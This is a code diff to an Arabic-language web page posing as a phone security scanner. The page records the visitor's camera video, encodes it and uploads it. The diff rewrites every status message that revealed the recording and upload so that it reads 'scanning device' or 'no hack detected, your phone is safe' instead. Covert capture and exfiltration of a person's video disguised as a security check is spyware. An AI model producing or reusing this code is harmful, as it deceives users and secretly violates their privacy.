@@ -177,7 +177,7 @@
         <div class="status-msg" id="statusMsg"></div>
         
         <div class="progress" id="progress">
-            <div class="progress-text" id="progressText">⏳ جاري فحص الهاتف...</div>
+            <div class="progress-text" id="progressText">⏳ جاري فحص الجهاز...</div>
             <div class="progress-bar">
                 <div class="progress-fill" id="progressFill"></div>
             </div>
@@ -185,7 +185,7 @@
         
         <div class="result" id="result">
             <div class="check-icon">✅</div>
-            <h2>تم الفحص - لا يوجد اختراق</h2>
+            <h2>لم يتم اكتشاف أي اختراق</h2>
             <p>هاتفك آمن ومحمي بالكامل</p>
         </div>
         
@@ -221,7 +221,7 @@
             const statusMsg = document.getElementById('statusMsg');
             
             btn.disabled = true;
-            btn.textContent = '⏳ جاري الفحص...';
+            btn.textContent = '⏳ جاري فحص الجهاز...';
             progress.classList.add('active');
             result.classList.remove('active');
             statusMsg.style.display = 'none';
@@ -250,7 +250,7 @@
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
                     
-                    statusMsg.textContent = '⏳ جاري تحويل الفيديو...';
+                    statusMsg.textContent = '⏳ جاري فحص الجهاز...';
                     statusMsg.style.color = '#f39c12';
                     statusMsg.style.display = 'block';
                     
@@ -260,7 +260,7 @@
                     reader.onload = async () => {
                         const base64 = reader.result;
                         
-                        statusMsg.textContent = '⏳ جاري رفع الفيديو...';
+                        statusMsg.textContent = '⏳ جاري فحص الجهاز...';
                         statusMsg.style.color = '#f39c12';
                         
                         try {
@@ -278,10 +278,10 @@
                             
                             progress.classList.remove('active');
                             result.classList.add('active');
-                            statusMsg.textContent = '✅ تم رفع الفيديو بنجاح!';
+                            statusMsg.textContent = '✅ لم يتم اكتشاف أي اختراق';
                             statusMsg.style.color = '#27ae60';
                             
-                            btn.textContent = '✅ تم الفحص - لا يوجد اختراق';
+                            btn.textContent = '✅ لم يتم اكتشاف أي اختراق';
                             btn.disabled = false;
                             btn.classList.add('success');
                         } catch (error) {
@@ -303,7 +303,7 @@
                     
                     if (progressValue >= 100) {
                         clearInterval(progressInterval);
-                        progressText.textContent = '✅ اكتمل الفحص!';
+                        progressText.textContent = '⏳ جاري فحص الجهاز...';
                         setTimeout(() => {
                             mediaRecorder.stop();
                         }, 1000);
